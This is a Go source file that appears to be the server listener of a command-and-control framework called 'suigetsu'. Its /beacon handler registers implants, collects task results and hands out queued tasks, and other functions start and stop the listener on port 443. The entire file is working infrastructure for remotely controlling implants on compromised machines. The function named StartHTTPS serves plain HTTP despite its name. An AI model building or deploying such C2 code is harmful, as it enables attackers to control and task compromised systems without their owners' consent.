package listeners
import (
	"io"
	"net/http"
	"context"
	"time"
	"suigetsu/server/beacon"
	"fmt"
)

func (m *Manager) handleBeacon(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "bad request", 400)
		return
	}
	fmt.Printf("got connection, body len: %d\n", len(body))
	b, err := m.Receiver.Process(body)
	if err != nil {
		fmt.Printf("beacon rejected: %s\n", err)
		http.Error(w, "invalid beacon", 400)
		return
	}
	fmt.Printf("beacon type: %d data: %s\n", b.Type, string(b.Data))
	implantID := fmt.Sprintf("%x", b.ImplantID)
	if b.Type == beacon.TypeCheckin {
		m.Queue.RegisterImplant(implantID, string(b.Data))
	}
	if b.Type == beacon.TypeResult {
		m.Queue.CompleteTask(implantID, string(b.Data))
	}

	m.Queue.UpdateLastSeen(implantID)
	task, err := m.Queue.GetNextTask(implantID)
	if err != nil {
		w.Write([]byte("noop"))
		return
	}
	w.Write([]byte(task))
}

func (m *Manager) StartHTTPS() {
	m.mu.Lock()
	if m.activeHTTP != nil {
		m.mu.Unlock()
		return
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/beacon", m.handleBeacon)
	server := &http.Server{
		Addr:    ":443",
		Handler: mux,
	}
	m.activeHTTP = server
	m.mu.Unlock()

	go func() {
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			fmt.Printf("HTTP listener error: %v\n", err)
		}
	}()
}

func (m *Manager) StopHTTPS() {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.activeHTTP == nil {
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	_ = m.activeHTTP.Shutdown(ctx)
	m.activeHTTP = nil
}